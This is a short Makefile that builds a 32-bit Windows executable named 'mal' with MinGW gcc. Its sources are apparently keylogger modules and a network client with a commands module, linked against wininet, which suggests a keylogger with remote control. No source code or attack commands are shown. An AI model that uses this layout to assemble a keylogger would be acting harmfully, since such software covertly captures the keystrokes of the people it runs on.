
CC = C:/msys64/mingw32/bin/gcc.exe # C:/msys64/mingw32/bin/gcc.exe # Compiler

CFLAGS = -Wall -m32 -g -O0 # -m32 # compiler flags

TARGET = mal # output executable name

# source files
SRCS = \
	src/main.c \
	src/program/program.c \
	src/program/utils.c \
	src/keylogger/keylogger.c \
	src/keylogger/keypair.c \
	src/client/client.c \
	src/client/commands.c

$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) -lwininet

.PHONY: clean
clean:
	-del $(TARGET).exe

# C:\msys64\mingw32\bin\mingw32-make.exe

	
